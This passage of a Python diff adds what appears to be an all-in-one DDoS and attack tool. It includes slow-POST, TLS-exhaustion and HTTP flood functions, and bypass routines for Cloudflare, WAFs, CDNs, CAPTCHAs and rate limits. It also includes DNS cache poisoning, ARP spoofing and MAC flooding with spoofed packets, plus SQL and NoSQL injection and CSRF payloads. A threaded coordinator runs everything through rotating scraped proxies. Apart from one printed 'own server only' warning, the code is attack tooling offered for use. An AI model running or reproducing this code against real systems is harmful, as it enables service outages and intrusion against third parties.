+            time.sleep(1)
+        
+        return True
+    except:
+        return False
+
+def rudy_attack(target, vps_node, headers, proxies):
+    """R-U-Dead-Yet (RUDY) Attack"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        if proxies:
+            proxy = random.choice(list(set(PROXY_LIST + SCRAPED_PROXIES)))
+            proxy_host, proxy_port = proxy.split(':')
+            s.connect((proxy_host, int(proxy_port)))
+            s.send(f"CONNECT {target}:443 HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+            response = s.recv(4096)
+        else:
+            s.connect((target, 443))
+        
+        # SSL handshake
+        context = ssl.create_default_context()
+        ssl_sock = context.wrap_socket(s, server_hostname=target)
+        
+        # Send headers with content-length but no data
+        ssl_sock.send(b"POST / HTTP/1.1\r\n")
+        ssl_sock.send(f"Host: {target}\r\n".encode())
+        ssl_sock.send(b"Content-Length: 1000000\r\n")
+        ssl_sock.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
+        ssl_sock.send(b"Connection: keep-alive\r\n\r\n")
+        
+        # Keep connection open but never send data
+        time.sleep(300)
+        
+        return True
+    except:
+        return False
+
+def hash_dos_attack(target, vps_node, headers, proxies):
+    """Hash DoS Attack"""
+    try:
+        # Generate many hash collisions
+        collisions = []
+        for i in range(1000):
+            # Create strings that hash to the same value
+            collision = f"a{'a' * i}"
+            collisions.append(collision)
+        
+        # Send POST with collision data
+        data = "&".join([f"key={collision}" for collision in collisions])
+        
+        response = requests.post(
+            f"http://{target}/",
+            data=data,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def ssl_exhaustion_attack(target, vps_node, headers, proxies):
+    """SSL Exhaustion Attack"""
+    try:
+        context = ssl.create_default_context()
+        
+        for _ in range(50):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            if proxies:
+                proxy = random.choice(list(set(PROXY_LIST + SCRAPED_PROXIES)))
+                proxy_host, proxy_port = proxy.split(':')
+                s.connect((proxy_host, int(proxy_port)))
+                s.send(f"CONNECT {target}:443 HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+                response = s.recv(4096)
+            else:
+                s.connect((target, 443))
+            
+            # SSL handshake
+            ssl_sock = context.wrap_socket(s, server_hostname=target)
+            
+            # Continuous handshake
+            for _ in range(10):
+                ssl_sock.do_handshake()
+                time.sleep(1)
+        
+        return True
+    except:
+        return False
+
+def tls_handshake_exhaustion_attack(target, vps_node, headers, proxies):
+    """TLS Handshake Exhaustion Attack"""
+    try:
+        for _ in range(100):
+            context = ssl.create_default_context()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            if proxies:
+                proxy = random.choice(list(set(PROXY_LIST + SCRAPED_PROXIES)))
+                proxy_host, proxy_port = proxy.split(':')
+                s.connect((proxy_host, int(proxy_port)))
+                s.send(f"CONNECT {target}:443 HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+                response = s.recv(4096)
+            else:
+                s.connect((target, 443))
+            
+            # TLS handshake with different ciphers
+            context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256')
+            ssl_sock = context.wrap_socket(s, server_hostname=target)
+            
+            # Single handshake
+            ssl_sock.do_handshake()
+            ssl_sock.close()
+        
+        return True
+    except:
+        return False
+
+def http_pipelining_attack(target, vps_node, headers, proxies):
+    """HTTP Pipelining Attack"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        if proxies:
+            proxy = random.choice(list(set(PROXY_LIST + SCRAPED_PROXIES)))
+            proxy_host, proxy_port = proxy.split(':')
+            s.connect((proxy_host, int(proxy_port)))
+            s.send(f"CONNECT {target}:80 HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+            response = s.recv(4096)
+        else:
+            s.connect((target, 80))
+        
+        # Send many requests without waiting for response
+        for _ in range(100):
+            request = f"GET /?pipeline={vps_node.node_id} HTTP/1.1\r\nHost: {target}\r\n\r\n"
+            s.send(request.encode())
+        
+        return True
+    except:
+        return False
+
+def head_flood_attack(target, vps_node, headers, proxies):
+    """HEAD Flood Attack"""
+    try:
+        for _ in range(50):
+            response = requests.head(
+                f"http://{target}/?head={vps_node.node_id}",
+                headers=headers,
+                proxies=proxies,
+                timeout=30,
+                verify=False
+            )
+            ATTACK_STATS["server_response"][response.status_code] += 1
+        
+        return True
+    except:
+        return False
+
+def get_flood_attack(target, vps_node, headers, proxies):
+    """GET Flood Attack"""
+    try:
+        for _ in range(50):
+            response = requests.get(
+                f"http://{target}/?get={vps_node.node_id}",
+                headers=headers,
+                proxies=proxies,
+                timeout=30,
+                verify=False
+            )
+            ATTACK_STATS["server_response"][response.status_code] += 1
+        
+        return True
+    except:
+        return False
+
+def post_flood_attack(target, vps_node, headers, proxies):
+    """POST Flood Attack"""
+    try:
+        data = {"test": os.urandom(100).hex()}
+        
+        for _ in range(50):
+            response = requests.post(
+                f"http://{target}/?post={vps_node.node_id}",
+                data=data,
+                headers=headers,
+                proxies=proxies,
+                timeout=30,
+                verify=False
+            )
+            ATTACK_STATS["server_response"][response.status_code] += 1
+        
+        return True
+    except:
+        return False
+
+# Bypass Attacks
+def cloudflare_bypass_attack(target, vps_node, headers, proxies):
+    """Cloudflare Bypass Attack"""
+    if not is_domain(target):
+        return False
+    
+    try:
+        options = Options()
+        options.add_argument("--headless")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+        
+        if proxies:
+            proxy_url = proxies.get("http")
+            if proxy_url:
+                options.add_argument(f"--proxy-server={proxy_url}")
+        
+        driver = webdriver.Chrome(options=options)
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        
+        driver.get(f"https://{target}")
+        time.sleep(5)
+        
+        # Check for Cloudflare
+        if "cloudflare" in driver.page_source.lower():
+            print(f"[!] Cloudflare detected, solving challenge...")
+            
+            try:
+                # Try different challenge solutions
+                WebDriverWait(driver, 30).until(
+                    lambda d: "cloudflare" not in d.page_source.lower()
+                )
+                
+                ATTACK_STATS["hits"] += 1
+                driver.quit()
+                return True
+            except:
+                ATTACK_STATS["errors"] += 1
+                driver.quit()
+                return False
+        else:
+            ATTACK_STATS["hits"] += 1
+            driver.quit()
+            return True
+            
+    except Exception as e:
+        ATTACK_STATS["errors"] += 1
+        return False
+
+def waf_bypass_attack(target, vps_node, headers, proxies):
+    """WAF Bypass Attack"""
+    try:
+        # Common WAF bypass techniques
+        bypass_techniques = [
+            # SQL Injection comments
+            "/?id=1/*",
+            "/?id=1--",
+            "/?id=1#",
+            # Unicode bypass
+            "/?id=1%C2%A0",
+            "/?id=1%E0%80%80",
+            # Case variation
+            "/?ID=1",
+            "/?Id=1",
+            # Parameter pollution
+            "/?id=1&id=2",
+            # Fragment identifier
+            "/?id=1#test",
+            # Null bytes
+            "/?id=1%00",
+            # Overlong UTF-8
+            "/?id=1%C0%80",
+            # Mixed encoding
+            "/?id=%2531",
+        ]
+        
+        technique = random.choice(bypass_techniques)
+        url = f"http://{target}{technique}"
+        
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def cdn_bypass_attack(target, vps_node, headers, proxies):
+    """CDN Bypass Attack"""
+    try:
+        # Try to bypass CDN by accessing directly
+        # Get real IP behind CDN
+        real_ip = socket.gethostbyname(target)
+        
+        # Check if it's a known CDN
+        cdn_ips = {
+            "Cloudflare": ["173.245.48.0/20", "104.16.0.0/12"],
+            "Akamai": ["23.32.0.0/12", "23.64.0.0/10"],
+            "Fastly": ["151.101.0.0/16", "146.75.0.0/16"]
+        }
+        
+        is_cdn = False
+        for cdn, ip_ranges in cdn_ips.items():
+            for ip_range in ip_ranges:
+                network = ipaddress.ip_network(ip_range)
+                if ipaddress.ip_address(real_ip) in network:
+                    is_cdn = True
+                    break
+        
+        if is_cdn:
+            # Try to access origin server directly
+            headers["Host"] = target
+            url = f"http://{real_ip}/"
+        else:
+            url = f"http://{target}/"
+        
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def captcha_bypass_attack(target, vps_node, headers, proxies):
+    """CAPTCHA Bypass Attack"""
+    try:
+        # Try various CAPTCHA bypass techniques
+        bypass_methods = [
+            # Empty CAPTCHA field
+            {"captcha": ""},
+            # Common CAPTCHA solutions
+            {"captcha": "admin"},
+            {"captcha": "1234"},
+            {"captcha": "test"},
+            # Remove CAPTCHA parameter
+            {},
+            # Multiple CAPTCHA fields
+            {"captcha": ["", "", ""]},
+            # Very long CAPTCHA
+            {"captcha": "a" * 1000}
+        ]
+        
+        method = random.choice(bypass_methods)
+        
+        response = requests.post(
+            f"http://{target}/login",
+            data=method,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def js_challenge_bypass_attack(target, vps_node, headers, proxies):
+    """JavaScript Challenge Bypass Attack"""
+    try:
+        # Try to bypass JS challenges
+        challenge_solutions = [
+            # No JavaScript
+            {"javascript": "disabled"},
+            # Empty challenge response
+            {"challenge_response": ""},
+            # Common solutions
+            {"challenge_response": "solved"},
+            {"challenge_response": "true"},
+            {"challenge_response": "1"},
+            # Multiple solutions
+            {"challenge_response": ["solved", "true", "1"]},
+            # Very long response
+            {"challenge_response": "a" * 1000}
+        ]
+        
+        solution = random.choice(challenge_solutions)
+        
+        response = requests.post(
+            f"http://{target}/verify",
+            data=solution,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def browser_validation_bypass_attack(target, vps_node, headers, proxies):
+    """Browser Validation Bypass Attack"""
+    try:
+        # Try various browser validation bypasses
+        bypass_headers = [
+            # No browser headers
+            {},
+            # Common browser headers
+            {"User-Agent": "Mozilla/5.0"},
+            # Mobile browser
+            {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"},
+            # Bot-like headers
+            {"User-Agent": "curl/7.68.0"},
+            # Empty user agent
+            {"User-Agent": ""},
+            # Multiple user agents
+            {"User-Agent": ["Mozilla/5.0", "curl/7.68.0"]},
+            # Custom browser
+            {"User-Agent": "MyCustomBrowser/1.0"}
+        ]
+        
+        bypass_header = random.choice(bypass_headers)
+        headers.update(bypass_header)
+        
+        response = requests.get(
+            f"http://{target}/",
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def honeypot_bypass_attack(target, vps_node, headers, proxies):
+    """Honeypot Bypass Attack"""
+    try:
+        # Try to detect and bypass honeypots
+        honeypot_indicators = [
+            "/admin",
+            "/wp-admin",
+            "/phpmyadmin",
+            "/.env",
+            "/config",
+            "/setup",
+            "/install",
+            "/test"
+        ]
+        
+        # Check for honeypot responses
+        for indicator in honeypot_indicators:
+            url = f"http://{target}{indicator}"
+            
+            response = requests.get(
+                url,
+                headers=headers,
+                proxies=proxies,
+                timeout=10,
+                verify=False
+            )
+            
+            # Check for honeypot signatures
+            if response.status_code == 200 and "honeypot" in response.text.lower():
+                # Honeypot detected, skip
+                continue
+            elif response.status_code == 404:
+                # Normal 404, continue
+                continue
+            else:
+                # Possible real target
+                ATTACK_STATS["server_response"][response.status_code] += 1
+                return response.status_code == 200
+        
+        return True
+    except:
+        return False
+
+def rate_limit_bypass_attack(target, vps_node, headers, proxies):
+    """Rate Limit Bypass Attack"""
+    try:
+        # Try various rate limit bypass techniques
+        bypass_techniques = [
+            # IP rotation
+            {"X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"},
+            # User-Agent rotation
+            {"User-Agent": UserAgent().random},
+            # Header variation
+            {"X-Real-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"},
+            # Session variation
+            {"Cookie": f"session={os.urandom(16).hex()}"},
+            # Parameter variation
+            {"cache_buster": random.randint(1, 1000000)}
+        ]
+        
+        technique = random.choice(bypass_techniques)
+        headers.update(technique)
+        
+        url = f"http://{target}/?bypass={vps_node.node_id}"
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+# Advanced Attacks
+def dns_tunneling_attack(target, vps_node, headers, proxies):
+    """DNS Tunneling Attack"""
+    try:
+        # Create DNS tunnel data
+        data = os.urandom(50)
+        encoded_data = base64.b64encode(data).decode()
+        
+        # Split into chunks for DNS labels
+        chunks = [encoded_data[i:i+63] for i in range(0, len(encoded_data), 63)]
+        
+        for chunk in chunks:
+            # Create subdomain with data
+            subdomain = f"{chunk}.tunnel.{vps_node.node_id}.example.com"
+            
+            # Send DNS query
+            dns_server = random.choice(["8.8.8.8", "1.1.1.1"])
+            ip = IP(src=target, dst=dns_server)
+            udp = UDP(sport=RandShort(), dport=53)
+            dns = DNS(rd=1, qd=DNSQR(qname=subdomain, qtype="A"))
+            send(ip/udp/dns, verbose=0, count=1)
+        
+        return True
+    except:
+        return False
+
+def dns_cache_poisoning_attack(target, vps_node, headers, proxies):
+    """DNS Cache Poisoning Attack"""
+    try:
+        # Try to poison DNS cache
+        dns_server = random.choice(["8.8.8.8", "1.1.1.1"])
+        
+        # Send malicious DNS response
+        ip = IP(src=dns_server, dst=target)
+        udp = UDP(sport=53, dport=53)
+        dns = DNS(id=random.randint(1000, 9000), qr=0, aa=1, 
+                 an=DNSRR(ttl=300, rdata=vps_node.ip, rrname=target))
+        send(ip/udp/dns, verbose=0, count=10)
+        
+        return True
+    except:
+        return False
+
+def arp_spoofing_attack(target, vps_node, headers, proxies):
+    """ARP Spoofing Attack"""
+    try:
+        # Send ARP spoofing packets
+        target_mac = "00:11:22:33:44:55"
+        gateway_ip = target.rsplit('.', 1)[0] + '.1'
+        
+        # Send ARP replies
+        for _ in range(20):
+            arp_packet = Ether(src=vps_node.ip, dst=target_mac) / ARP(psrc=gateway_ip, pdst=target, hwsrc=vps_node.ip, hwdst=target_mac)
+            sendp(arp_packet, verbose=0)
+        
+        return True
+    except:
+        return False
+
+def mac_flooding_attack(target, vps_node, headers, proxies):
+    """MAC Flooding Attack"""
+    try:
+        # Generate random MAC addresses
+        for _ in range(100):
+            mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
+            
+            # Send packets with random MAC
+            packet = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(dst=target) / ICMP()
+            sendp(packet, verbose=0)
+        
+        return True
+    except:
+        return False
+
+def vlan_hopping_attack(target, vps_node, headers, proxies):
+    """VLAN Hopping Attack"""
+    try:
+        # Try VLAN hopping
+        vlan_ids = [1, 10, 20, 30, 40, 50]
+        
+        for vlan_id in vlan_ids:
+            # Create VLAN tagged packet
+            packet = Ether() / Dot1Q(vlan=vlan_id) / IP(dst=target) / ICMP()
+            sendp(packet, verbose=0)
+        
+        return True
+    except:
+        return False
+
+def bgp_hijacking_simulation_attack(target, vps_node, headers, proxies):
+    """BGP Hijacking Simulation Attack"""
+    try:
+        # Simulate BGP hijacking
+        bgp_packet = IP(src=vps_node.ip, dst=target) / TCP(dport=179, flags="S") / \
+                     BGPHeader(type=2, len=50) / BGPOpen(version=4, asn=vps_node.node_id)
+        
+        send(bgp_packet, verbose=0, count=10)
+        return True
+    except:
+        return False
+
+def ipv6_flood_attack(target, vps_node, headers, proxies):
+    """IPv6 Flood Attack"""
+    try:
+        # Generate IPv6 address
+        ipv6_target = f"::{target.split('.')[-1]}"
+        
+        # Send IPv6 packets
+        for _ in range(50):
+            src_ipv6 = f"::{random.randint(1, 9999)}"
+            packet = IPv6(src=src_ipv6, dst=ipv6_target) / ICMPv6EchoRequest()
+            send(packet, verbose=0)
+        
+        return True
+    except:
+        return False
+
+def icmpv6_flood_attack(target, vps_node, headers, proxies):
+    """ICMPv6 Flood Attack"""
+    try:
+        # Generate IPv6 address
+        ipv6_target = f"::{target.split('.')[-1]}"
+        
+        # Send ICMPv6 packets
+        for _ in range(50):
+            src_ipv6 = f"::{random.randint(1, 9999)}"
+            packet = IPv6(src=src_ipv6, dst=ipv6_target) / ICMPv6Packet(type=128)  # Echo Request
+            send(packet, verbose=0)
+        
+        return True
+    except:
+        return False
+
+# Specialized Attacks
+def cookie_bombing_attack(target, vps_node, headers, proxies):
+    """Cookie Bombing Attack"""
+    try:
+        # Create large cookies
+        cookie_value = "a" * 4000  # 4KB cookie
+        
+        # Create multiple cookies
+        cookies = {}
+        for i in range(100):
+            cookies[f"cookie_{i}"] = cookie_value
+        
+        # Send request with large cookies
+        response = requests.get(
+            f"http://{target}/",
+            headers=headers,
+            cookies=cookies,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def session_fixation_attack(target, vps_node, headers, proxies):
+    """Session Fixation Attack"""
+    try:
+        # Generate session ID
+        session_id = base64.b64encode(os.urandom(16)).decode()
+        
+        # Set session cookie
+        headers["Cookie"] = f"session_id={session_id}"
+        
+        # Send request with session
+        response = requests.get(
+            f"http://{target}/",
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        # Try to use session in another request
+        response2 = requests.post(
+            f"http://{target}/login",
+            data={"username": "test", "password": "test"},
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        ATTACK_STATS["server_response"][response2.status_code] += 1
+        return response.status_code == 200 or response2.status_code == 200
+    except:
+        return False
+
+def csrf_attack(target, vps_node, headers, proxies):
+    """CSRF Attack"""
+    try:
+        # Generate CSRF token
+        csrf_token = os.urandom(16).hex()
+        
+        # Create malicious form
+        form_data = {
+            "username": "admin",
+            "password": "hacked",
+            "csrf_token": csrf_token
+        }
+        
+        # Send POST request
+        response = requests.post(
+            f"http://{target}/change_password",
+            data=form_data,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def xss_dos_attack(target, vps_node, headers, proxies):
+    """XSS DoS Attack"""
+    try:
+        # Create XSS payload
+        xss_payload = f"<script>{'a' * 1000}</script>"
+        
+        # Send XSS payload in various parameters
+        params = ["q", "search", "query", "term", "keyword"]
+        param = random.choice(params)
+        
+        response = requests.get(
+            f"http://{target}/?{param}={xss_payload}",
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def sql_injection_dos_attack(target, vps_node, headers, proxies):
+    """SQL Injection DoS Attack"""
+    try:
+        # Create SQL injection payloads
+        sql_payloads = [
+            "' OR 1=1--",
+            "' UNION SELECT NULL--",
+            "' AND 1=1--",
+            "' OR SLEEP(10)--",
+            "' WAITFOR DELAY '0:0:10'--",
+            "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)--"
+        ]
+        
+        payload = random.choice(sql_payloads)
+        
+        # Send SQL injection
+        response = requests.get(
+            f"http://{target}/search?q={payload}",
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def nosql_injection_dos_attack(target, vps_node, headers, proxies):
+    """NoSQL Injection DoS Attack"""
+    try:
+        # Create NoSQL injection payloads
+        nosql_payloads = [
+            '{"$ne": null}',
+            '{"$where": "this.a == this.a"}',
+            '{"$gt": ""}',
+            '{"$or": [{"a": 1}, {"a": 2}]}',
+            '{"$nin": [1, 2, 3]}'
+        ]
+        
+        payload = random.choice(nosql_payloads)
+        
+        # Send NoSQL injection
+        response = requests.post(
+            f"http://{target}/api/search",
+            json={"query": payload},
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def file_upload_bomb_attack(target, vps_node, headers, proxies):
+    """File Upload Bomb Attack"""
+    try:
+        # Create large file
+        file_data = os.urandom(10 * 1024 * 1024)  # 10MB
+        
+        # Upload file with different names
+        filenames = [f"bomb_{i}.txt" for i in range(10)]
+        
+        for filename in filenames:
+            files = {"file": (filename, file_data, "text/plain")}
+            
+            response = requests.post(
+                f"http://{target}/upload",
+                files=files,
+                headers=headers,
+                proxies=proxies,
+                timeout=60,
+                verify=False
+            )
+            
+            ATTACK_STATS["server_response"][response.status_code] += 1
+        
+        return True
+    except:
+        return False
+
+def log_injection_attack(target, vps_node, headers, proxies):
+    """Log Injection Attack"""
+    try:
+        # Create log injection payloads
+        log_payloads = [
+            f"test\n{os.urandom(100).hex()}",
+            f"test\r{os.urandom(100).hex()}",
+            f"test%0a{os.urandom(100).hex()}",
+            f"test%0d{os.urandom(100).hex()}"
+        ]
+        
+        payload = random.choice(log_payloads)
+        
+        # Send log injection
+        response = requests.post(
+            f"http://{target}/login",
+            data={"username": payload, "password": "test"},
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def email_bombing_attack(target, vps_node, headers, proxies):
+    """Email Bombing Attack"""
+    try:
+        # Create email bombing payload
+        email_payloads = [
+            {"email": f"test{vps_node.node_id}@example.com", "subject": "Test", "message": "Test"},
+            {"email": f"test{vps_node.node_id}@test.com", "subject": "Test", "message": "Test"},
+            {"email": f"bomb{vps_node.node_id}@bomb.com", "subject": "Bomb", "message": "Bomb"}
+        ]
+        
+        payload = random.choice(email_payloads)
+        
+        # Send email bombing
+        response = requests.post(
+            f"http://{target}/contact",
+            data=payload,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+# VPS Based Attacks
+def vps_cpu_intensive_attack(target, vps_node, headers, proxies):
+    """VPS CPU Intensive Attack"""
+    try:
+        # Simulate CPU intensive computation
+        for _ in range(1000):
+            hashlib.sha256(os.urandom(1024)).hexdigest()
+        
+        # Send HTTP request
+        url = f"http://{target}/?cpu_attack={vps_node.node_id}"
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def vps_memory_intensive_attack(target, vps_node, headers, proxies):
+    """VPS Memory Intensive Attack"""
+    try:
+        # Simulate memory intensive operation
+        memory_chunks = []
+        for i in range(100):
+            chunk = os.urandom(1024 * 1024)  # 1MB chunks
+            memory_chunks.append(chunk)
+        
+        # Send HTTP request
+        url = f"http://{target}/?memory_attack={vps_node.node_id}"
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        
+        # Free memory
+        del memory_chunks
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def vps_network_intensive_attack(target, vps_node, headers, proxies):
+    """VPS Network Intensive Attack"""
+    try:
+        # Simulate network intensive operation
+        data = os.urandom(1024 * 1024)  # 1MB data
+        
+        # Send large amount of data
+        url = f"http://{target}/?network_attack={vps_node.node_id}"
+        response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=30, verify=False)
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def vps_mixed_attack(target, vps_node, headers, proxies):
+    """VPS Mixed Attack"""
+    try:
+        # Simulate mixed resource usage
+        # CPU intensive
+        for _ in range(500):
+            hashlib.sha256(os.urandom(512)).hexdigest()
+        
+        # Memory intensive
+        memory_chunks = []
+        for i in range(50):
+            memory_chunks.append(os.urandom(512 * 1024))
+        
+        # Network intensive
+        data = os.urandom(512 * 1024)
+        
+        # Send HTTP request
+        url = f"http://{target}/?mixed_attack={vps_node.node_id}"
+        response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=30, verify=False)
+        
+        # Free memory
+        del memory_chunks
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def vps_distributed_attack(target, vps_node, headers, proxies):
+    """VPS Distributed Attack"""
+    try:
+        # Simulate distributed attack from VPS
+        attack_methods = [
+            "cpu_intensive",
+            "memory_intensive",
+            "network_intensive",
+            "mixed_attack"
+        ]
+        
+        method = random.choice(attack_methods)
+        
+        # Send attack request
+        url = f"http://{target}/?distributed_attack={vps_node.node_id}&method={method}"
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+# ===================== MAIN ATTACK COORDINATOR =====================
+def start_attack(method_choice, targets):
+    global ATTACK_STATS, THREADS, ADAPTATION_ENABLED, AUTO_SCRAPE_PROXY, PERFECT_MODE, VPS_SIMULATION, LOAD_BALANCING, FULL_METHODS
+    
+    ATTACK_STATS["start_time"] = time.time()
+    
+    print("\n" + "="*150)
+    print("   ATTACK CONFIGURATION")
+    print("="*150)
+    print(f"   Targets: {len(targets)}")
+    print(f"   Duration: {DURATION} seconds")
+    print(f"   Threads: {THREADS}")
+    print(f"   Method: {method_choice}")
+    print(f"   VPS Nodes: {len(VPS_NODES)}")
+    print(f"   Perfect Adaptation: {'ON' if ADAPTATION_ENABLED else 'OFF'}")
+    print(f"   Auto Proxy Scrape: {'ON' if AUTO_SCRAPE_PROXY else 'OFF'}")
+    print(f"   Perfect Mode: {'ON' if PERFECT_MODE else 'OFF'}")
+    print(f"   VPS Simulation: {'ON' if VPS_SIMULATION else 'OFF'}")
+    print(f"   Load Balancing: {'ON' if LOAD_BALANCING else 'OFF'}")
+    print(f"   Full Methods: {'ON' if FULL_METHODS else 'OFF'}")
+    print("="*150)
+    print("[!] WARNING: HANYA UNTUK SERVER SENDIRI!")
+    print("[!] STARTING ATTACK...\n")
+    
+    # Start proxy scraping thread
+    if AUTO_SCRAPE_PROXY:
+        scrape_thread = threading.Thread(target=scrape_proxies)
+        scrape_thread.daemon = True
+        scrape_thread.start()
+    
+    # Start stats monitor
+    stats_thread = threading.Thread(target=enhanced_stats_monitor)
+    stats_thread.daemon = True
+    stats_thread.start()
+    
+    # Initialize attack manager
+    attack_manager = FullAttackManager(method_choice, targets)
+    
+    # Run attacks with ThreadPoolExecutor
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        for attack_func in attack_manager.attack_methods:
+            for _ in range(THREADS // len(attack_manager.attack_methods)):
+                executor.submit(attack_manager.execute_attack, attack_func)
+
+# ===================== ENHANCED STATS MONITOR =====================
+def enhanced_stats_monitor():
+    """Monitor statistik dengan visualisasi canggih"""
+    while True:
+        if ATTACK_STATS["start_time"]:
+            elapsed = time.time() - ATTACK_STATS["start_time"]
+            hits_per_sec = ATTACK_STATS["hits"] / elapsed if elapsed > 0 else 0
+            
+            total_requests = ATTACK_STATS["hits"] + ATTACK_STATS["errors"]
+            success_rate = (ATTACK_STATS["hits"] / total_requests * 100) if total_requests > 0 else 0
+            error_rate = (ATTACK_STATS["errors"] / total_requests * 100) if total_requests > 0 else 0
+            
+            # System metrics
+            cpu = ATTACK_STATS["performance_metrics"]["cpu_usage"]
+            memory = ATTACK_STATS["performance_metrics"]["memory_usage"]
+            network = ATTACK_STATS["performance_metrics"]["network_usage"]
+            
+            # VPS metrics
+            active_nodes = ATTACK_STATS["vps_stats"]["active_nodes"]
+            total_traffic = ATTACK_STATS["vps_stats"]["total_traffic"]
+            
+            # Method effectiveness
+            effective_methods = []
+            for method, effectiveness in ATTACK_STATS["method_effectiveness"].items():
+                if effectiveness > 0.7:  # 70% effectiveness
+                    effective_methods.append(method)
+            
+            # AI metrics
+            ai_evolution = len(ai_optimizer.evolution_history)
+            best_methods = [m[0] for m in ai_optimizer.success_matrix.most_common(3)]
+            
+            # Evasion metrics
+            stealth_success = sum(1 for p in ATTACK_STATS["proxy_stats"].values() if p["success"] > 10)
+            
+            # Zero-day metrics
+            zero_day_success = sum(1 for exploit in zero_day.exploit_database.values() 
+                                if ATTACK_STATS["method_stats"].get(exploit["cve"], {}).get("hits", 0) > 0)
+            
+            # Enhanced display
+            print(f"\r" + "="*200)
+            print(f"\r[ULTIMATE] Targets: {len(targets)} | Nodes: {active_nodes} | Hits: {ATTACK_STATS['hits']} | Errors: {ATTACK_STATS['errors']} | "
+                  f"Success: {success_rate:.1f}% | Error: {error_rate:.1f}% | Hits/sec: {hits_per_sec:.2f}")
+            print(f"\r[SYSTEM] CPU: {cpu:.1f}% | Memory: {memory:.1f}% | Network: {network:.1f}MB | "
+                  f"Proxies: {len(SCRAPED_PROXIES)} | Threads: {THREADS}")
